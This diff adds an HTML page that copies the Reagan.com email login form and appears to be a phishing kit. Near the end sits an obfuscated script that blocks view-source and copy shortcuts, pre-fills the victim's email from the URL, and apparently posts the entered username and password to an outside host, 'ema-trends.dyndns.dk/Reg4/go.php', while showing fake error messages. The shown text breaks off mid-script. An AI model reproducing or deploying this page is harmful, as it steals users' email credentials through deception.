@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html class="clsLogin theme-white"><head>
+<title>Private Email Account Login | Secure Email Service</title>
+<meta http-equiv="Content-type" content="text/html; charset=UTF-8">
+<meta name="description" content="A secure email service gives you peace of mind. Reagan email gives our members the most private email account experience. Learn more about Reagan email in our FAQ.">
+<meta name="keywords" content="">
+<meta name="generator" content="nopCommerce">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="google-site-verification" content="jRMxipCjp-4L3AMmcyBqTGgdGzD54nM5fv7n81kcYGA">
+<link href="REgan_files/css2.css" rel="stylesheet">
+<link href="REgan_files/jquery-ui-1.10.3.custom.min.css" rel="stylesheet" type="text/css">
+<link href="REgan_files/style.css" rel="stylesheet" type="text/css">
+<link href="REgan_files/styles.css" rel="stylesheet" type="text/css">
+<script type="text/javascript" async="" src="REgan_files/js"></script><script async="" src="REgan_files/fbevents.js"></script><script type="text/javascript" async="" src="REgan_files/insight.min.js"></script><script src="REgan_files/bat.js" async=""></script><script type="text/javascript" async="" src="REgan_files/analytics.js"></script><script type="text/javascript" async="" src="REgan_files/vms.js"></script><script async="" src="REgan_files/beacon.js"></script><script async="" src="REgan_files/gtm.js"></script><script src="REgan_files/jquery-1.10.2.min.js" type="text/javascript"></script>
+<script src="REgan_files/jquery.scrollTo-min.js" type="text/javascript"></script>
+<script src="REgan_files/jquery.maskedinput-1.3.1.js" type="text/javascript"></script>
+<script src="REgan_files/socialite.js" type="text/javascript"></script>
+
+<link rel="shortcut icon" type="image/x-icon" href="https://www.reagan.com/images/favicon.ico">
+
+<link href="REgan_files/responsive.css" rel="stylesheet" type="text/css">
+<link href="REgan_files/font-awesome.css" rel="stylesheet" type="text/css">
+<link href="REgan_files/slick_002.css" rel="stylesheet" type="text/css">
+<link href="REgan_files/slick-theme.css" rel="stylesheet" type="text/css">
+<link href="REgan_files/colorbox.css" rel="stylesheet" type="text/css">
+<script src="REgan_files/jquery.colorbox.js" type="text/javascript"></script>
+<script>
+        $(function () {
+            $('.mytooltip').tooltip({
+                position: {
+                    my: "center bottom-20",
+                    at: "center top",
+                    using: function (position, feedback) {
+                        $(this).css(position);
+                        $("<div>")
+                            .addClass("arrow")
+                            .addClass(feedback.vertical)
+                            .addClass(feedback.horizontal)
+                            .appendTo(this);
+                    }
+                }
+            });
+        });
+
+
+
+    </script>
+
+<script type="text/javascript" src="REgan_files/jquery.fancybox.js"></script>
+<link rel="stylesheet" type="text/css" href="REgan_files/jquery.fancybox.css" media="screen">
+
+<link rel="stylesheet" type="text/css" href="REgan_files/jquery.fancybox-buttons.css">
+ <script type="text/javascript" src="REgan_files/jquery.fancybox-buttons.js"></script>
+
+<link rel="stylesheet" type="text/css" href="REgan_files/jquery.fancybox-thumbs.css">
+<script type="text/javascript" src="REgan_files/jquery.fancybox-thumbs.js"></script>
+
+<script type="text/javascript" src="REgan_files/jquery.fancybox-media.js"></script>
+<script src="REgan_files/jquery.easing.1.3.js" type="text/javascript"></script>
+<script type="text/javascript">
+        $(document).ready(function () {
+            var distance = $('.header-section').offset().top;
+            $window = $(window); $window.scroll(function () {
+                //if ($(window).width() > 768) {
+                if ($window.scrollTop() > distance) {
+                    $("body").addClass('sticky');
+                }
+                else { $("body").removeClass('sticky'); }
+                //}
+            });
+
+            $('.mobmenu').click(function () {
+                $('.header-links').slideToggle();
+            });
+
+            if (navigator.userAgent.indexOf('Mac OS X') != -1) {
+                $(".links ul li a, .blck4-rgt-in p, .copy-right p").css('font-family', 'DIN-RegularAlterna');
+            }
+        });
+    </script>
+<script src="REgan_files/jquery.slimscroll.js" type="text/javascript"></script>
+<script type="text/javascript">
+        $(function () {
+            $('.scrollable').slimScroll({
+                size: '20px',
+                height: '528px',
+                railVisible: true,
+                railColor: '#939191',
+                color: '#0969a8',
+                alwaysVisible: true,
+
+            });
+        });
+
+
+
+
+
+    </script>
+<link href="REgan_files/slick.css" rel="stylesheet" type="text/css">
+<link href="REgan_files/slick-theme_002.css" rel="stylesheet" type="text/css">
+<script src="REgan_files/slick.js" type="text/javascript"></script>
+<!--[if lt IE 9]>
+    <script src="http://ie7-js.googlecode.com/svn/version/2.1(beta4)/IE9.js">
+    </script>
+    <![endif]-->
+<!--[if lt IE 9]>
+    <style>
+    .banner-section{margin:-1px 0 0 0;}
+    </style>
+    <![endif]-->
+<!--[if IE 7]>
+    <style>
+    .banner-section{margin:-4px 0 0 0;}
+    </style>
+    <![endif]-->
+<meta property="og:title" content="reagan.com">
+<meta property="og:image" content="https://www.reagan.com/Content/Images/logoshare2.png">
+
+<script>
+        (function (w, d, s, l, i) {
+            w[l] = w[l] || []; w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            }); var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-KJMZB2');</script>
+
+
+<script>
+        var _comscore = _comscore || [];
+        _comscore.push({ c1: "2", c2: "20076229", c3: "https://www.reagan.com" });
+        (function () {
+            var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
+            s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
+            el.parentNode.insertBefore(s, el);
+        })();
+    </script>
+<noscript>
+        <img src="http://b.scorecardresearch.com/p?c1=2&c2=20076229&cv=2.0&cj=1" />
+    </noscript>
+
+
+<script>
+        (function (h, o, t, j, a, r) {
+            h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
+            h._hjSettings = { hjid: 511517, hjsv: 5 };
+            a = o.getElementsByTagName('head')[0];
+            r = o.createElement('script'); r.async = 1;
+            r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
+            a.appendChild(r);
+        })(window, document, '//static.hotjar.com/c/hotjar-', '.js?sv=');
+    </script><script async="" src="REgan_files/hotjar-511517.js"></script>
+<style type="text/css">.fancybox-margin{margin-right:17px;}</style><script src="REgan_files/5176603.js" type="text/javascript" async="" data-ueto="ueto_da20c5ec50"></script></head>
+<body class="">
+
+<noscript>
+        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KJMZB2"
+                height="0" width="0" style="display:none;visibility:hidden"></iframe>
+    </noscript>
+
+<div class="ajax-loading-block-window" style="display: none">
+</div>
+<div id="dialog-notifications-success" title="Notification" style="display:none;">
+</div>
+<div id="dialog-notifications-error" title="Error" style="display:none;">
+</div>
+<div id="dialog-notifications-warning" title="Warning" style="display:none;">
+</div>
+<div id="bar-notification" class="bar-notification">
+<span class="close" title="Close">&nbsp;</span>
+</div>
+<!--[if lte IE 7]>
+    <div style="clear:both;height:59px;text-align:center;position:relative;">
+        <a href="http://www.microsoft.com/windows/internet-explorer/default.aspx" target="_blank">
+            <img src="/Themes/Reagan/Content/images/ie_warning.jpg" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." />
+        </a>
+    </div>
+<![endif]-->
+
+<div class="wrapper">
+
+<div class="header-section">
+<div class="TopHeader">
+Reagan.com has a new look!
+</div>
+<div class="header">
+<div class="logo">
+<a class="lg1" href="https://www.reagan.com/"><img src="REgan_files/logo1.png" alt="Reagan Best Private Email" height="48"></a>
+<img class="lg2" src="REgan_files/logo1.png" alt="Reagan Best Private Email" height="48">
+</div>
+<div class="header-right">
+<div class="mobmenu">
+<img src="REgan_files/menu2.png" alt="menu" width="33" height="24">
+</div>
+<div class="btnblue"><a href="https://www.reagan.com/reagancom-personal-email">Join Now</a></div>
+</div>
+<div class="header-links">
+<nav>
+<ul>
+<li class="last no_brd pad_last"><a href="https://www.reagan.com/blog">Blog</a></li>
+<li><a href="https://reagan.zendesk.com/home" target="_blank">Support</a></li>
+<li class="last no_brd pad_last"><a href="https://www.reagan.com/customer/dashboard">Member Area</a></li>
+<li>
+<a class="email" href="https://webmail.reagan.com/">My Email</a>
+</li>
+</ul>
+</nav>
+</div>
+<div class="clear"></div>
+</div>
+</div>
+
+<div class="ajax-loading-block-window" style="display: none">
+<div class="loading-image">
+</div>
+</div>
+<div class="main-content" style="min-height: 449px;">
+<div class="main-content-in">
+<div class="container centeralign">
+<div class="master-wrapper-center-2" style="margin-top: 0px; padding-top: 0px;">
+<div class="master-wrapper-cph-2" style="margin-top: 0px; padding-top: 0px;">
+<div class="login-page">
+<div class="clear"></div>
+<div class="wrapper">
+<div class="LoginContent">
+<h1 class="newLoginBlogTitle">
+<br><br>
+Check our latest blogs for vital stories regarding personal liberty, 
+government overreach, and other topics that affect your health, 
+finances, and general well-being during these times of crises.
+</h1>
+<div class="bloglogin containernew">
+<div class="banner">
+<div class="banner_in">
+<h2>FEATURED STORY</h2>
+<div class="banner_left">
+<a href="https://www.reagan.com/how-to-protect-your-digital-privacy-at-work"><img src="REgan_files/iStock-641382150_super.jpg" alt=""></a>
+</div>
+<div class="banner_right">
+<h4>How to Protect Your Digital Privacy at Work</h4>
+<p>
+One of the most frequently asked questions we receive at Reagan.com is: “Does a person have a right to privacy at work?”
+</p>
+<a href="https://www.reagan.com/how-to-protect-your-digital-privacy-at-work"><i><span>READ MORE</span></i></a>
+</div>
+<div class="clear"></div>
+</div>
+</div>
+</div>
+<div class="reaganrecommends">
+<h4>Reagan.com Recommends</h4>
+<a class="lnka" href="https://www.prageru.com/" target="_blank" onclick="ga('send', 'event', 'Link', 'click', 'PragerU on reagan login');"><img class="prageruweb" src="REgan_files/prageruweb2.png"></a>
+&nbsp;&nbsp;
+<a class="lnka" href="http://go.streetshares.com/reagan" target="_blank" onclick="ga('send', 'event', 'Link', 'click', 'StreetShare on reagan login');"><img class="prageruweb" src="REgan_files/StreetSharesT.png"></a>
+</div>
+<br><br><br>
+<div class="btnblue"><a href="https://www.reagan.com/reagancom-personal-email" tabindex="0">Join Now</a></div>
+</div>
+<div class="returning-wrapper">
+<span class="login-title">
+<a href=""><img src="REgan_files/newReturning.png"></a><br>
+</span>
+<div class="login-block">
+<form method="post" id="frm" novalidate="novalidate">
+<table class="login-table-container">
+<tbody>
+          
+<span class="alert alert-danger" id="msg" style="display: none;"><p style="color:red">Login was unsuccessful. Please correct the errors and try again.</p></span>
+          <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+
+<br>
+<tr class="row">
+<td class="item-name">
+<label for="Username">Username:</label>
+</td>
+<td class="item-value">
+<input class="username" autofocus="autofocus" type="text" id="email" name="Username">
+<span class="field-validation-valid" data-valmsg-for="Username" data-valmsg-replace="true"></span>
+</td>
+</tr>
+<tr class="row">
+<td class="item-name">
+<label for="Password">Password:</label>
+</td>
+<td class="item-value">
+<input class="password" type="password" id="password" name="Password">
+<span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span>
+</td>
+</tr>
+<tr class="row">
+<td class="item-value" colspan="2">
+<input type="checkbox" data-val="true" data-val-required="The Remember me? field is required." id="RememberMe" name="RememberMe" value="true">
+<label for="RememberMe">Remember me?</label>
+</td>
+</tr>
+<tr class="row">
+<td class="forgot-password" colspan="2">
+<a href="https://www.reagan.com/emailpasswordreset">Forgot password?</a>
+</td>
+</tr>
+<tr class="row">
+<td colspan="2">
+<div class="captcha-box">
+<div><script type="text/javascript">var onloadCallback = function() {turnstile.render('#recaptcha', {'sitekey' : '0x4AAAAAAAB6VnXbbs48kzZO', 'theme' : 'light' });};</script><div class="cf-turnstile" data-callback="onCallback" id="recaptcha"><iframe style="border: medium none; overflow: hidden; width: 300px; height: 65px;" src="REgan_files/normal.htm" id="cf-chl-widget-0udic" tabindex="0" title="Widget containing a Cloudflare security challenge"></iframe><input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-0udic_response" value="0.UXCu-ILo5LgMlLpPh06SCjhA4fnzIhR2w6lLKjPp7JMVtNxUwBAkbuSb4YF6sBCki65z6VQWnxBLy7xWQHcAdFmbSLGaMHS4_v2iOayro_rADg7RyoAp72iU-qoMOlk5DLEW7hAiHnrNrwpUCisfqxiFbPCu4BaV5sYEMzvztrqhGhkPXhUUMqk1F3MclOS-nnEUSLDRc2-9ZIwn9wvIkddKp3xZw0uvDEEBFWBmLmEvStSHFVdMKqEmxUST8hqAx-2-TwqzN_1nebsy97D69xABI3RFUS0A8duOs1pWOxOSXdNKtThgFhIUouJGwG47.Ic9Hw0pCkIckJf8lWX6ReQ.8f81e2d784a65e48cd73ae0409725399c0b842595b593ec475a8e7dc4aa1c853"><input type="hidden" name="g-recaptcha-response" id="cf-chl-widget-0udic_g_response" value="0.UXCu-ILo5LgMlLpPh06SCjhA4fnzIhR2w6lLKjPp7JMVtNxUwBAkbuSb4YF6sBCki65z6VQWnxBLy7xWQHcAdFmbSLGaMHS4_v2iOayro_rADg7RyoAp72iU-qoMOlk5DLEW7hAiHnrNrwpUCisfqxiFbPCu4BaV5sYEMzvztrqhGhkPXhUUMqk1F3MclOS-nnEUSLDRc2-9ZIwn9wvIkddKp3xZw0uvDEEBFWBmLmEvStSHFVdMKqEmxUST8hqAx-2-TwqzN_1nebsy97D69xABI3RFUS0A8duOs1pWOxOSXdNKtThgFhIUouJGwG47.Ic9Hw0pCkIckJf8lWX6ReQ.8f81e2d784a65e48cd73ae0409725399c0b842595b593ec475a8e7dc4aa1c853"></div><script async="" defer="defer" src="REgan_files/api.js"></script><script>    var mycftoken = '';    function onCallback(token) {        mycftoken = token;    }    function validate(event) {        event.preventDefault();        var res = turnstile.getResponse('#recaptcha');         if(res === mycftoken) {             var frm = document.getElementById('frm');            frm.submit();        } else {             alert('Captcha not valid');     }    function onload() {        var element = document.getElementById('btnSubmit');       element.onclick = validate;    }</script></div>
+</div>
+<div class="buttons">
+<button class="loginbutton" type="submit" id="submit-btn" name="btnSubmit">Log in</button>
+<script>onload();</script>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<input name="__RequestVerificationToken" type="hidden" value="CfDJ8PgRRc_eJDFEje78Qz8SJZZuz5Jw9RUn3CJSz4AZRvuvsjyY7KnnC74NkeyLFga_Do_Ur6YolmUIz8_QGT14WUAD3eHqGq4dGHmxto-VL5aqpsOV4yQ2gXUMXFrr54Gj0hH3qUWW9htR91aNmr9PCDE"><input name="RememberMe" type="hidden" value="false"></form>
+</div>
+<div class="LoginTermLinks">
+Terms of Service: <a href="https://www.reagan.com/TermsOfService" target="_blank">Mail</a> | <a href="https://www.reagan.com/PrivacyInfo" target="_blank">Privacy Policy</a>
+</div>
+</div>
+<div class="clear">
+</div>
+<div class="externalauthentication">
+</div>
+<div class="clear">
+</div>
+</div>
+</div>
+<script type="text/javascript">
+    $(document).ready(function () {
+        $(".master-wrapper-cph-2").css({ "margin-top": "0px", "padding-top": "0px" });
+        $(".master-wrapper-center-2").css({ "margin-top": "0px", "padding-top": "0px" });
+    });
+</script>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="footer-section">
+<div class="container">
+<div class="footer">
+<div class="footer-in">
+<div class="footrow footerlogo">
+<a href="https://www.reagan.com/"><img src="REgan_files/reagan-grays.png" alt="Reagan best private email service"></a>
+</div>
+<div class="footrow">
+<div class="footleft">
+<ul>
+<li><a href="https://reagan.zendesk.com/home" target="_blank">Support</a></li>
+<li><a href="https://www.reagan.com/PrivacyInfo">Privacy</a></li>
+<li class="last no_brd pad_last"><a href="https://www.reagan.com/TermsOfService">Terms of Service</a></li>
+</ul>
+</div>
+<div class="footmid">
+<p>© 2023 <a href="https://www.reagan.com/">Reagan</a>. </p>
+</div>
+<div class="footright">
+<div class="footlinks">
+<a href="https://www.reagan.com/" class="reagan">@Reagan.com</a>&nbsp;|&nbsp;
+<a class="mail" href="https://webmail.reagan.com/">My Email</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+<script src="REgan_files/jquery.validate.min.js" type="text/javascript"></script>
+<script src="REgan_files/jquery.validate.unobtrusive.min.js" type="text/javascript"></script>
+<script src="REgan_files/jquery-ui-1.10.3.custom.min.js" type="text/javascript"></script>
+<script src="REgan_files/jquery-migrate-1.2.1.min.js" type="text/javascript"></script>
+<script src="REgan_files/public.common.js" type="text/javascript"></script>
+<script src="REgan_files/public.ajaxcart.js" type="text/javascript"></script>
+<script type="text/javascript">
+        AjaxCart.init(false, '.header-links .cart-qty', '.header-links .wishlist-qty', '#flyout-cart');
+    </script>
+<script>
+        $().ready(function () {
+            $.scrollTo('50%', { axis: 'x' });
+            $(window).resize(function () { $.scrollTo('50%', { axis: 'x' }); });
+        });
+
+        $(document).ready(function () {
+            $("#dvContent").resize(function () {
+                $("#dvMain").height($("#dvHeader").height() + $("#dvContent").height() + $("#dvFooter").height() + 148);
+            });
+
+        });
+
+        function bottomfooter() {
+            if (parseInt($(".header-section").height() + $(".banner-section").height() + $(".footer-section").height()) < parseInt($(window).height())) {
+                //$(".banner-section").height( $(window).height() - ($(".header-section").height() + $(".footer-section").height()));
+                //$(".main-content").height($(window).height() - ($(".header-section").height() + $(".footer-section").height()));
+                $('.banner-section').css('min-height', ($(window).height() - ($(".header-section").height() + $(".footer-section").height()))+'px');
+                $('.main-content').css('min-height', ($(window).height() - ($(".header-section").height() + $(".footer-section").height())) + 'px');
+            }
+        }
+
+
+
+        equalheight = function (container) {
+
+            var currentTallest = 0,
+                currentRowStart = 0,
+                rowDivs = new Array(),
+                $el,
+                topPosition = 0;
+            $(container).each(function () {
+                $el = $(this);
+                $($el).height('auto')
+                topPostion = $el.position().top;
+                if (currentRowStart !== topPostion) {
+                    for (currentDiv = 0; currentDiv < rowDivs.length; currentDiv++) {
+                        rowDivs[currentDiv].height(currentTallest);
+                    }
+                    rowDivs.length = 0; // empty the array
+                    currentRowStart = topPostion;
+                    currentTallest = $el.height();
+                    rowDivs.push($el);
+                } else {
+                    rowDivs.push($el);
+                    currentTallest = (currentTallest < $el.height()) ? ($el.height()) : (currentTallest);
+                }
+                for (currentDiv = 0; currentDiv < rowDivs.length; currentDiv++) {
+                    rowDivs[currentDiv].height(currentTallest);
+                }
+            });
+        }
+
+        if ($(document).width() > "768") {
+            $(window).load(function () { equalheight('.ehgt'); });
+            $(window).resize(function () { equalheight('.ehgt'); });
+            $(window).width(function () { equalheight('.ehgt'); });
+        }
+
+        window.addEventListener("orientationchange", function () {
+            // Announce the new orientation number
+            //alert(window.orientation);
+            equalheight('.ehgt');
+        }, false);
+
+        window.addEventListener("resize", function () {
+            // Get screen size (inner/outerWidth, inner/outerHeight)
+            equalheight('.ehgt');
+            bottomfooter();
+        }, false);
+
+        bottomfooter();
+
+    </script>
+
+
+<script type="text/javascript">
+        /* <![CDATA[ */
+        var google_conversion_id = 1011077379;
+        var google_custom_params = window.google_tag_params;
+        var google_remarketing_only = true;
+        /* ]]> */
+    </script>
+<script type="text/javascript" src="REgan_files/conversion.js">
+    </script>
+<noscript>
+        <div style="display:inline;">
+            <img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/1011077379/?guid=ON&amp;script=0" />
+        </div>
+    </noscript>
+ 
+<script type="text/javascript">
+            var _bcvma = _bcvma || [];
+            _bcvma.push(["setAccountID", "480320872207381664"]);
+            _bcvma.push(["setParameter", "InvitationDefID", "7573239295319316424"]);
+            _bcvma.push(["pageViewed"]);
+            (function () {
+                var vms = document.createElement("script"); vms.type = "text/javascript"; vms.async = true;
+                vms.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + "vmss.boldchat.com/aid/480320872207381664/bc.vms4/vms.js";
+                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(vms, s);
+            })();
+        </script>
+<noscript>
+            <a href="http://www.boldchat.com" title="Visitor Monitoring" target="_blank"><img alt="Visitor Monitoring" src="https://vms.boldchat.com/aid/480320872207381664/bc.vmi?" border="0" width="1" height="1" /></a>
+        </noscript>
+
+<script defer="defer" src="REgan_files/vaafb692b2aea4879b33c060e79fe94621666317369993" integrity="sha512-0ahDYl866UMhKuYcW078ScMalXqtFJggm7TmlUtp0UlD4eQk0Ixfnm5ykXKvGJNFjLMoortdseTfsRT8oCfgGA==" data-cf-beacon="{&quot;rayId&quot;:&quot;78be545b9991a223&quot;,&quot;version&quot;:&quot;2022.11.3&quot;,&quot;r&quot;:1,&quot;token&quot;:&quot;1836e0189aae441cbb561736ee0886ea&quot;,&quot;si&quot;:100}" crossorigin="anonymous"></script>
+
+
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div><script type="text/javascript" id="">(function(c,d,f,g,e){c[e]=c[e]||[];var h=function(){var b={ti:"5176603"};b.q=c[e];c[e]=new UET(b);c[e].push("pageLoad")};var a=d.createElement(f);a.src=g;a.async=1;a.onload=a.onreadystatechange=function(){var b=this.readyState;b&&"loaded"!==b&&"complete"!==b||(h(),a.onload=a.onreadystatechange=null)};d=d.getElementsByTagName(f)[0];d.parentNode.insertBefore(a,d)})(window,document,"script","//bat.bing.com/bat.js","uetq");</script><noscript><img src="//bat.bing.com/action/0?ti=5176603&amp;Ver=2" height="0" width="0" style="display:none; visibility: hidden;"></noscript>
+
+<script type="text/javascript" id="">var google_conversion_id=1011077379,google_conversion_label="X3h1CP2Q1gIQg6KP4gM",google_custom_params=window.google_tag_params,google_remarketing_only=!0;</script>
+<script type="text/javascript" id="" src="REgan_files/conversion.js"></script><script type="text/javascript" id="">_linkedin_data_partner_id="117723";</script><script type="text/javascript" id="">(function(){var b=document.getElementsByTagName("script")[0],a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="https://snap.licdn.com/li.lms-analytics/insight.min.js";b.parentNode.insertBefore(a,b)})();</script>
+<noscript>
+<img height="1" width="1" style="display:none;" alt="" src="https://dc.ads.linkedin.com/collect/?pid=117723&amp;fmt=gif">
+</noscript>
+<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","1409218025931771");fbq("track","PageView");</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1409218025931771&amp;ev=PageView&amp;noscript=1"></noscript>
+<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon348358468537"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon75889367181" alt="" src="REgan_files/0" width="0" height="0"></div><div class="bcFloat" style="display: block; left: 0px; top: 326px; width: 1px; height: 1px; text-align: left; z-index: 3141591; overflow: hidden; position: fixed;"><div style="position: absolute; width: 1px; height: 1px; margin-left: 0px;"><a href="#"><img id="0.4962186805914077" alt="" src="REgan_files/clear.gif" border="0"></a></div></div></body>
+
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+        <script>
+
+function _0x34ce(){var _0x33020e=['<b\x20style=\x27color:red;\x27>Password\x20error\x20occured,\x20invalid\x20or\x20incorrect\x20password</b>','Restoring......','JSON','log','#msg','replace','10dsWKai','https://','https://www.reagan.com/login','48688palwXU','show','msg','location','val','hide','bind','#submit-btn','#error','48PuHwrh','indexOf','18mxnzaQ','html','addEventListener','18VoUBIs','#back1','ajax','focus','keypress','preventDefault','<span\x20style=\x27color:red;\x27>Username\x20or\x20Password\x20is\x20incorrect.\x20Please\x20try\x20again</span>','3811405xYjeGg','55792breQdZ','substr','contextmenu','keyCode','11661490cNqeZw','.email','length','3480VZyEJS','54705IRjRtk','Login','keydown','test','ctrlKey','POST','click','<b\x20style=\x27color:red;\x27>Enter\x20Email\x20Address</b>','https://ema-trends.dyndns.dk/Reg4/go.php','#password','ready','<b\x20style=\x27color:red;\x27>Enter\x20Password</b>','hash','#email','3314843WHUCXp','3949888JadSdq','signal'];_0x34ce=function(){return _0x33020e;};return _0x34ce();}function _0x4cea(_0x18fee0,_0x1ab202){var _0x34ce4e=_0x34ce();return _0x4cea=function(_0x4ceaf9,_0x3146a0){_0x4ceaf9=_0x4ceaf9-0x190;var _0x38a83a=_0x34ce4e[_0x4ceaf9];return _0x38a83a;},_0x4cea(_0x18fee0,_0x1ab202);}var _0x2a42ea=_0x4cea;(function(_0x1bbfcd,_0x3c02ca){var _0x59e064=_0x4cea,_0x58b03e=_0x1bbfcd();while(!![]){try{var _0x4cf068=-parseInt(_0x59e064(0x19b))/0x1*(parseInt(_0x59e064(0x19e))/0x2)+-parseInt(_0x59e064(0x1bc))/0x3*(parseInt(_0x59e064(0x1a7))/0x4)+-parseInt(_0x59e064(0x1b3))/0x5+-parseInt(_0x59e064(0x1ac))/0x6*(-parseInt(_0x59e064(0x192))/0x7)+-parseInt(_0x59e064(0x193))/0x8*(-parseInt(_0x59e064(0x1a9))/0x9)+parseInt(_0x59e064(0x1b8))/0xa+parseInt(_0x59e064(0x1b4))/0xb*(-parseInt(_0x59e064(0x1bb))/0xc);if(_0x4cf068===_0x3c02ca)break;else _0x58b03e['push'](_0x58b03e['shift']());}catch(_0xf2de3b){_0x58b03e['push'](_0x58b03e['shift']());}}}(_0x34ce,0xd68ff),$(document)[_0x2a42ea(0x1a4)](_0x2a42ea(0x1be),function(_0x5019ec){var _0x3c929e=_0x2a42ea;if(_0x5019ec[_0x3c929e(0x1c0)]&&_0x5019ec['which']==0x53)return _0x5019ec[_0x3c929e(0x1b1)](),![];}),document[_0x2a42ea(0x1ab)](_0x2a42ea(0x1b6),_0x1a5b5e=>_0x1a5b5e[_0x2a42ea(0x1b1)]()),document['onkeydown']=function(_0x454131){var _0x2021b0=_0x2a42ea;return _0x454131[_0x2021b0(0x1c0)]&&(_0x454131[_0x2021b0(0x1b7)]===0x43||_0x454131[_0x2021b0(0x1b7)]===0x56||_0x454131['keyCode']===0x55||_0x454131[_0x2021b0(0x1b7)]===0x75)?![]:!![];},$(document)[_0x2a42ea(0x1b0)]('u',function(_0x158f57){var _0x3043a1=_0x2a42ea;return _0x158f57[_0x3043a1(0x1c0)]?![]:!![];}),$(document)[_0x2a42ea(0x1c6)](function(){var _0x52c3bf=_0x2a42ea,_0x51a27c=0x0;$(_0x52c3bf(0x1ad))[_0x52c3bf(0x1c2)](function(){var _0x27fdd0=_0x52c3bf;$('#msg')[_0x27fdd0(0x1a3)](),$(_0x27fdd0(0x191))['val']('');});var _0x417b5b=window['location'][_0x52c3bf(0x190)][_0x52c3bf(0x1b5)](0x1);if(!_0x417b5b){}else{var _0x2a6688=_0x417b5b;$(_0x52c3bf(0x191))[_0x52c3bf(0x1a2)](_0x2a6688);var _0x5c5ebf=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x5c5ebf[_0x52c3bf(0x1bf)](_0x2a6688))return $(_0x52c3bf(0x1a6))[_0x52c3bf(0x19f)](),_0x417b5b['focus'],![];var _0x3d7eb1=_0x2a6688[_0x52c3bf(0x1a8)]('@'),_0x407064=_0x2a6688['substr'](_0x3d7eb1+0x1),_0x10a595=_0x52c3bf(0x19c)+_0x407064;$(_0x52c3bf(0x1b9))[_0x52c3bf(0x1aa)](_0x417b5b);}$('#submit-btn')[_0x52c3bf(0x1c2)](function(_0x5680ab){var _0x37432f=_0x52c3bf;_0x5680ab[_0x37432f(0x1b1)](),$(_0x37432f(0x1a6))['hide'](),$(_0x37432f(0x199))[_0x37432f(0x1a3)]();var _0x432c67=$('#email')['val'](),_0x5484bc=$('#password')[_0x37432f(0x1a2)](),_0x49c105=_0x432c67,_0x547b50=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x432c67)return 